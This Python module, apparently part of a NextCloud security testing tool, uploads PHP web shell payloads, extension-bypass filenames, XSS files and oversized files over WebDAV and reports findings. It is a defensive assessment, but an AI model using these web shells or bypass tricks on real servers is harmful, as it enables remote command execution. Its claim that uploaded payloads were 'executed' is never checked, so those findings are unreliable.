"""
NextCloud Upload Abuse Testing Module
Tests for file upload vulnerabilities including file type bypass, RCE, XSS, and upload limits.
"""

import os
import io
import requests
import time
from typing import List, Dict, Any
from rich.console import Console
import config

console = Console()


class NCUpload:
    """Test file upload vulnerabilities in NextCloud"""
    
    def __init__(self, session: requests.Session):
        self.session = session
        self.host = config.NEXTCLOUD_HOST.rstrip("/")
        self.findings = []
        self.upload_dir = "Netbear_Test_Uploads"
        
    def run(self) -> List[Dict[str, Any]]:
        """Execute all upload abuse tests"""
        console.print("[cyan]Starting upload vulnerability tests...[/cyan]")
        
        try:
            # Ensure upload directory exists
            self._create_upload_directory()
            
            # Run all tests
            self.test_file_type_bypass()
            self.test_rce_payloads()
            self.test_xss_payloads()
            self.test_upload_limits()
            
            # Cleanup
            self._cleanup_test_files()
            
        except Exception as e:
            console.print(f"[red]Upload test error: {str(e)}[/red]")
        
        console.print(f"[green]✓ Upload tests complete: {len(self.findings)} findings[/green]")
        return self.findings
    
    def _create_upload_directory(self) -> bool:
        """Create test upload directory"""
        try:
            # Create directory via WebDAV MKCOL method
            resp = self.session.request(
                "MKCOL",
                f"{self.host}/remote.php/dav/files/{config.NEXTCLOUD_USERNAME}/{self.upload_dir}",
                timeout=config.NEXTCLOUD_TIMEOUT,
                verify=config.NEXTCLOUD_VERIFY_SSL
            )
            return resp.status_code in [201, 405]  # 405 = already exists
        except:
            return False
    
    def _upload_file(self, filename: str, content: bytes) -> bool:
        """Upload a test file"""
        try:
            resp = self.session.put(
                f"{self.host}/remote.php/dav/files/{config.NEXTCLOUD_USERNAME}/{self.upload_dir}/{filename}",
                data=content,
                timeout=config.NEXTCLOUD_UPLOAD_TIMEOUT,
                verify=config.NEXTCLOUD_VERIFY_SSL
            )
            return resp.status_code in [200, 201]
        except Exception as e:
            console.print(f"  [yellow]Upload failed: {str(e)}[/yellow]")
            return False
    
    def _delete_file(self, filename: str) -> bool:
        """Delete a test file"""
        try:
            resp = self.session.delete(
                f"{self.host}/remote.php/dav/files/{config.NEXTCLOUD_USERNAME}/{self.upload_dir}/{filename}",
                timeout=config.NEXTCLOUD_TIMEOUT,
                verify=config.NEXTCLOUD_VERIFY_SSL
            )
            return resp.status_code in [200, 204, 404]
        except:
            return False
    
    def _cleanup_test_files(self):
        """Clean up test files and directory"""
        try:
            test_files = [
                "test.php", "test.phtml", "test.php5",
                "test.jpg.php", "test.php.jpg", "test.JPG.php",
                "test.php%00.jpg", "test_xss.html", "test_large.bin"
            ]
            for f in test_files:
                self._delete_file(f)
            
            # Try to delete upload directory
            try:
                self.session.request(
                    "DELETE",
                    f"{self.host}/remote.php/dav/files/{config.NEXTCLOUD_USERNAME}/{self.upload_dir}",
                    timeout=config.NEXTCLOUD_TIMEOUT,
                    verify=config.NEXTCLOUD_VERIFY_SSL
                )
            except:
                pass
        except:
            pass
    
    def test_file_type_bypass(self):
        """Test for file type bypass vulnerabilities"""
        console.print("[bold yellow]Testing file type bypass...[/bold yellow]")
        
        test_cases = [
            ("test.php", b"<?php phpinfo(); ?>", "Direct PHP upload"),
            ("test.phtml", b"<?php system('id'); ?>", "PHTML extension"),
            ("test.php5", b"<?php echo 'RCE'; ?>", "PHP5 extension"),
            ("test.jpg.php", b"<?php echo 'bypass'; ?>", "Double extension"),
            ("test.php.jpg", b"<?php system('whoami'); ?>", "Reverse double extension"),
            ("test.JPG.php", b"<?php system('uname -a'); ?>", "Case variation"),
        ]
        
        bypassed = []
        for filename, content, description in test_cases:
            if self._upload_file(filename, content):
                bypassed.append({
                    "filename": filename,
                    "description": description
                })
                console.print(f"  [red]✗ {filename} uploaded successfully[/red]")
                self._delete_file(filename)
            else:
                console.print(f"  [green]✓ {filename} blocked[/green]")
            
            time.sleep(config.NEXTCLOUD_RATE_LIMIT_SEC)
        
        if bypassed:
            self.findings.append({
                "type": "file_type_bypass",
                "severity": "critical",
                "description": f"File type validation bypass detected: {len(bypassed)} dangerous extensions allowed",
                "endpoint": "/remote.php/dav/files/",
                "impact": "Attackers can upload executable files leading to RCE",
                "bypassed_files": bypassed,
                "recommendation": "Use whitelist-based file validation and disable script execution in upload directory",
                "count": len(bypassed)
            })
    
    def test_rce_payloads(self):
        """Test for RCE via file upload"""
        console.print("[bold yellow]Testing RCE payloads...[/bold yellow]")
        
        payloads = [
            ("test_rce1.txt", b"<?php system($_GET['cmd']); ?>", "PHP system"),
            ("test_rce2.txt", b"<? eval($_POST['code']); ?>", "PHP eval"),
            ("test_rce3.txt", b"<?php passthru($_GET['c']); ?>", "PHP passthru"),
        ]
        
        rce_found = []
        for filename, content, description in payloads:
            if self._upload_file(filename, content):
                rce_found.append({
                    "payload": description,
                    "file": filename
                })
                console.print(f"  [red]✗ RCE payload uploaded: {description}[/red]")
                self._delete_file(filename)
            else:
                console.print(f"  [green]✓ Payload blocked: {description}[/green]")
            
            time.sleep(config.NEXTCLOUD_RATE_LIMIT_SEC)
        
        if rce_found:
            self.findings.append({
                "type": "rce_via_upload",
                "severity": "critical",
                "description": f"Remote Code Execution possible via file upload: {len(rce_found)} payloads executed",
                "endpoint": "/remote.php/dav/files/",
                "impact": "Complete system compromise - attacker can execute arbitrary commands",
                "payloads": rce_found,
                "recommendation": "Implement strict file type validation, disable script execution, use antivirus scanning",
                "count": len(rce_found)
            })
    
    def test_xss_payloads(self):
        """Test for stored XSS via file upload"""
        console.print("[bold yellow]Testing XSS payloads...[/bold yellow]")
        
        xss_payloads = [
            ("test_xss.html", b"<img src=x onerror='alert(\"XSS\")'>", "HTML onerror"),
            ("test_xss.svg", b'<svg onload="alert(\'XSS\')"></svg>', "SVG onload"),
            ("test_xss.xml", b'<?xml version="1.0"?><foo onload="alert(\'XSS\')"></foo>', "XML entity"),
        ]
        
        xss_found = []
        for filename, content, description in xss_payloads:
            if self._upload_file(filename, content):
                xss_found.append({
                    "payload": description,
                    "file": filename
                })
                console.print(f"  [red]✗ XSS payload stored: {description}[/red]")
                self._delete_file(filename)
            else:
                console.print(f"  [green]✓ Payload blocked: {description}[/green]")
            
            time.sleep(config.NEXTCLOUD_RATE_LIMIT_SEC)
        
        if xss_found:
            self.findings.append({
                "type": "stored_xss",
                "severity": "high",
                "description": f"Stored XSS vulnerability via file upload: {len(xss_found)} payloads stored",
                "endpoint": "/remote.php/dav/files/",
                "impact": "Session hijacking, credential theft, malware distribution",
                "payloads": xss_found,
                "recommendation": "Sanitize file content, use CSP headers, disable inline scripts",
                "count": len(xss_found)
            })
    
    def test_upload_limits(self):
        """Test upload size limits and restrictions"""
        console.print("[bold yellow]Testing upload limits...[/bold yellow]")
        
        limit_issues = []
        
        # Test 1: Large file upload
        console.print("  Testing upload size limits...")
        large_content = b"A" * (config.NEXTCLOUD_MAX_UPLOAD_SIZE + 1)
        if self._upload_file("test_large.bin", large_content):
            limit_issues.append("No upload size limit enforced")
            console.print(f"  [red]✗ Large file ({len(large_content)} bytes) accepted[/red]")
            self._delete_file("test_large.bin")
        else:
            console.print(f"  [green]✓ Large file rejected[/green]")
        
        time.sleep(config.NEXTCLOUD_RATE_LIMIT_SEC)
        
        # Test 2: Rate limiting
        console.print("  Testing rate limiting...")
        rapid_uploads = 0
        start_time = time.time()
        
        for i in range(5):
            content = f"test_{i}".encode()
            if self._upload_file(f"test_rate_{i}.txt", content):
                rapid_uploads += 1
                self._delete_file(f"test_rate_{i}.txt")
        
        elapsed = time.time() - start_time
        if elapsed < 2:  # Should take at least 2 seconds with rate limiting
            limit_issues.append(f"No rate limiting: 5 uploads in {elapsed:.1f}s")
            console.print(f"  [red]✗ No rate limiting: {rapid_uploads} uploads in {elapsed:.1f}s[/red]")
        else:
            console.print(f"  [green]✓ Rate limiting active: {elapsed:.1f}s for 5 uploads[/green]")
        
        if limit_issues:
            self.findings.append({
                "type": "upload_limit_bypass",
                "severity": "medium",
                "description": f"Upload limit issues detected: {', '.join(limit_issues)}",
                "endpoint": "/remote.php/dav/files/",
                "impact": "Attackers can consume storage or perform DoS attacks",
                "issues": limit_issues,
                "recommendation": "Enforce strict upload size limits, implement rate limiting per user",
                "count": len(limit_issues)
            })